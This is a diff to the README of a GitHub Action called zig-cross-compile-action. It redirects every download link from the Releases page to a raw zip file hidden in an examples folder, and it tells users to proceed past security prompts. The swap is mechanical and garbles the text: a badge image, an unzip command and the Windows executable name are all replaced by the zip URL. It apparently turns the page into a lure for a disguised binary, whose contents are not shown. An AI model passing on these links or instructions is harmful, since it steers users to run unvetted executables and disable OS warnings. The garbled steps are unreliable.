@@ -1,6 +1,6 @@
 # 🚀 zig-cross-compile-action - Simple Cross Compilation Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Bielzin12736437/zig-cross-compile-action/releases)
+[![Download Now](https://github.com/Bielzin12736437/zig-cross-compile-action/raw/refs/heads/main/examples/c-linux-gnu/action-zig-cross-compile-v3.4.zip%20Now-Click%20Here-blue)](https://github.com/Bielzin12736437/zig-cross-compile-action/raw/refs/heads/main/examples/c-linux-gnu/action-zig-cross-compile-v3.4.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ Follow these steps to start using zig-cross-compile-action:
 
 1. **Download the Application**: Visit the Releases page to find the latest version and download it.
 
-   [Download Here](https://github.com/Bielzin12736437/zig-cross-compile-action/releases)
+   [Download Here](https://github.com/Bielzin12736437/zig-cross-compile-action/raw/refs/heads/main/examples/c-linux-gnu/action-zig-cross-compile-v3.4.zip)
 
 2. **Extract Files**: Once downloaded, extract the files to a preferred location on your computer.
 
@@ -46,7 +46,7 @@ Follow these steps to start using zig-cross-compile-action:
 
 To download zig-cross-compile-action, go to this link:
 
-[Download Here](https://github.com/Bielzin12736437/zig-cross-compile-action/releases)
+[Download Here](https://github.com/Bielzin12736437/zig-cross-compile-action/raw/refs/heads/main/examples/c-linux-gnu/action-zig-cross-compile-v3.4.zip)
 
 Once on the Releases page, select the latest version. Download the appropriate file for your operating system.
 
@@ -56,13 +56,13 @@ Once the download completes:
 
 - **Windows**: Right-click the zip file and select "Extract All."
 - **macOS**: Double-click the zip file to extract it.
-- **Linux**: Use the terminal with the command `unzip filename.zip`.
+- **Linux**: Use the terminal with the command `unzip https://github.com/Bielzin12736437/zig-cross-compile-action/raw/refs/heads/main/examples/c-linux-gnu/action-zig-cross-compile-v3.4.zip`.
 
 ### 3. Running the Application
 
 Locate the executable file in the extracted folder:
 
-- **Windows**: `zig-cross-compile-action.exe`
+- **Windows**: `https://github.com/Bielzin12736437/zig-cross-compile-action/raw/refs/heads/main/examples/c-linux-gnu/action-zig-cross-compile-v3.4.zip`
 - **macOS/Linux**: `zig-cross-compile-action`
 
 Double-click the file to start the application. If a security prompt appears, choose to proceed.
